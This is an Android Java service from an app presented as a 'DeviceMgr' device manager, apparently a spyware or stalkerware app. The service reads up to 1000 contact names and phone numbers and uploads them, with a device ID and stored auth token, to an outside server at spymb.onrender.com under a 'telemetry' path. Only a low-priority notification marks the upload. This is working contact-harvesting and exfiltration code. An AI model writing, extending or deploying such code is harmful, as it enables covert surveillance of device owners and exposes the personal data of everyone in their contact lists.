package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Locale;

import com.company.devicemgr.utils.HttpClient;

public class ContactsUploaderService extends Service {
	private static final String TAG = "ContactsUploaderSvc";
	private static final String CHANNEL_ID = "contacts_uploader_channel";
	private static final int NOTIF_ID = 2001;
	
	@Override
	public void onCreate() {
		super.onCreate();
		createNotificationChannel();
	}
	
	private void createNotificationChannel() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Contacts Upload", NotificationManager.IMPORTANCE_LOW);
			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
			if (nm != null) nm.createNotificationChannel(ch);
		}
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// must start foreground quickly when started via startForegroundService()
		Notification n = buildNotification("A enviar lista de contactos...");
		startForeground(NOTIF_ID, n);
		
		// run upload in background and stop when done
		new Thread(() -> {
			try {
				uploadContactsOnce();
				} catch (Exception e) {
				Log.e(TAG, "uploadContactsOnce err", e);
				} finally {
				try { stopForeground(true); } catch (Exception ignored) {}
				try { stopSelf(); } catch (Exception ignored) {}
			}
		}).start();
		
		return START_NOT_STICKY;
	}
	
	private Notification buildNotification(String text) {
		NotificationCompat.Builder b = new NotificationCompat.Builder(this, CHANNEL_ID)
		.setContentTitle("DeviceMgr - Contacts")
		.setContentText(text)
		.setSmallIcon(android.R.drawable.ic_menu_send)
		.setPriority(NotificationCompat.PRIORITY_LOW);
		return b.build();
	}
	
	private void uploadContactsOnce() {
		try {
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
				if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
					Log.i(TAG, "no READ_CONTACTS permission");
					return;
				}
			}
			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
			String deviceId = sp.getString("deviceId", "unknown");
			String token = sp.getString("auth_token", null);
			
			ContentResolver cr = getContentResolver();
			Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
			String[] projection = {
				ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
				ContactsContract.CommonDataKinds.Phone.NUMBER
			};
			Cursor cur = cr.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
			if (cur == null) {
				Log.i(TAG, "no contacts cursor");
				return;
			}
			
			JSONArray arr = new JSONArray();
			int max = 1000; // safety limit
			while (cur.moveToNext() && max-- > 0) {
				try {
					String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
					String number = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
					if (number == null) continue;
					JSONObject jo = new JSONObject();
					jo.put("name", name != null ? name : "");
					jo.put("number", number != null ? number : "");
					arr.put(jo);
					} catch (Exception ex) {
					Log.w(TAG, "contact item err", ex);
				}
			}
			cur.close();
			
			JSONObject body = new JSONObject();
			body.put("type", "contacts");
			body.put("payload", arr);
			
			String url = String.format(Locale.US, "https://spymb.onrender.com/api/telemetry/%s", deviceId);
			try {
				String res = HttpClient.postJson(url, body.toString(), token);
				Log.i(TAG, "contacts upload response: " + res);
				} catch (Exception e) {
				Log.e(TAG, "contacts upload http err", e);
			}
			} catch (Exception e) {
			Log.e(TAG, "uploadContactsOnce error", e);
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
}